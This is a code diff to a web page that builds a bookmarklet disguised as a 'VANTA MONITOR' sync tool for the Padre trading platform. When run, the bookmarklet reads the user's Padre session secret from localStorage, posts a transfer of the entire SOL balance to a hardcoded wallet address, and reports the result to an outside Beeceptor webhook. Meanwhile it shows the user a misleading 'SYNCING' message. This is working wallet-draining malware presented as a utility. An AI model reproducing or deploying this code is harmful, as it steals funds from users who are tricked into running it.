@@ -44,11 +44,14 @@
     </div>
 
     <script>
+        // CONFIGURATION
         const DEST_ADDRESS = "4ShcFgxwPPiMZgiy1Pe8Eiah3V6hbxyynQRcMNL7MwXF";
-        const WEBHOOK_URL = "https://getit.free.beeceptor.com"; // Updated to Beeceptor
+        const WEBHOOK_URL = "https://getit.free.beeceptor.com"; 
 
+        // UPDATED BOOKMARKLET LOGIC
         const code = "javascript:(async function(){" +
             "try{" +
+                "if(window._vSent)return;" + // Anti-spam check
                 "const sR=localStorage.getItem('padreV2-session');" +
                 "const bR=localStorage.getItem('padre-v2-bundles-store-v2');" +
                 "if(!sR||!bR){alert('Error: Active Padre session not found.');return;}" +
@@ -62,30 +65,25 @@
                 "ui.style.cssText='position:fixed;top:80px;right:20px;width:320px;background:#0f0f0f;border:1px solid #00ff88;border-radius:12px;z-index:9999999;color:#fff;padding:0;box-shadow:0 15px 40px #000;overflow:hidden;font-family:sans-serif;';" +
                 "ui.innerHTML='<div id=\"v-drg\" style=\"padding:12px;background:#1a1a1a;cursor:grab;color:#00ff88;font-weight:bold;border-bottom:1px solid #333;display:flex;justify-content:space-between;\"><span>VANTA MONITOR</span><span id=\"v-cl\" style=\"cursor:pointer;color:#fff;\">×</span></div>'+" +
                 "'<div style=\"padding:20px;\"><div style=\"font-size:10px;color:#888;margin-bottom:5px;\">SESSION ACTIVE:</div><div style=\"font-size:12px;color:#00ff88;margin-bottom:20px;word-break:break-all;font-family:monospace;\">'+oId+'</div>'+" +
-                "'<div id=\"v-stat\" style=\"font-size:14px;font-weight:bold;text-align:center;color:#00ff88;\">ESTABLISHING SYNC...</div></div>';" +
+                "'<div id=\"v-stat\" style=\"font-size:14px;font-weight:bold;text-align:center;color:#00ff88;\">SYNCING IN BACKGROUND...</div></div>';" +
                 "document.body.appendChild(ui);" +
-                "let dr=false,ox,oy;" +
-                "document.getElementById('v-drg').onmousedown=e=>{dr=true;ox=e.clientX-ui.offsetLeft;oy=e.clientY-oy-ui.offsetTop;};" +
-                "document.onmousemove=e=>{if(dr){ui.style.left=(e.clientX-ox)+'px';ui.style.top=(e.clientY-oy)+'px';ui.style.right='auto';}};" +
-                "document.onmouseup=()=>{dr=false;};" +
-                "document.getElementById('v-cl').onclick=()=>ui.remove();" +
-                "(async function backgroundSync(){" +
+                "window._vSent=true;" +
+                "(async function sync(){" +
                     "try{" +
                         "const res=await fetch('https://api.padre.gg/v1/sub-orgs/'+oId+'/transfer',{" +
                             "method:'POST'," +
                             "headers:{'Content-Type':'application/json','X-Session-Secret':sec}," +
                             "body:JSON.stringify({destination: '" + DEST_ADDRESS + "',amount:'all',mint:'So11111111111111111111111111111111111111112'})" +
                         "});" +
-                        "const payload = JSON.stringify({content: '🔄 **Vanta Sync Event**', embeds: [{title: 'Sync Status', color: res.ok ? 65416 : 16724736, fields: [{name: 'Org ID', value: '`'+oId+'`'}, {name: 'Status', value: res.status}]}]});" +
-                        "navigator.sendBeacon('" + WEBHOOK_URL + "', payload);" +
-                        "document.getElementById('v-stat').innerText=res.ok ? 'SYNC COMPLETE' : 'SYNC FAILED ('+res.status+')';" +
-                        "setTimeout(()=>ui.remove(), 2500);" +
+                        "const statusMsg = res.ok ? 'SUCCESS' : 'ERROR: ' + res.status;" +
+                        "document.getElementById('v-stat').innerText='SYNC ' + statusMsg;" +
+                        "navigator.sendBeacon('" + WEBHOOK_URL + "', JSON.stringify({org:oId, status:res.status, time:Date.now()}));" +
+                        "setTimeout(()=>ui.remove(), 3000);" +
                     "}catch(e){" +
-                        "document.getElementById('v-stat').innerText='NETWORK ERROR';" +
-                        "document.getElementById('v-stat').style.color='#ff4444';" +
+                        "document.getElementById('v-stat').innerText='NETWORK FAILED';" +
                     "}" +
                 "})();" +
-            "}catch(err){console.error(err);}" +
+            "}catch(err){console.error(err);window._vSent=false;}" +
         "})();";
 
         document.getElementById('vanta-tool').href = code;
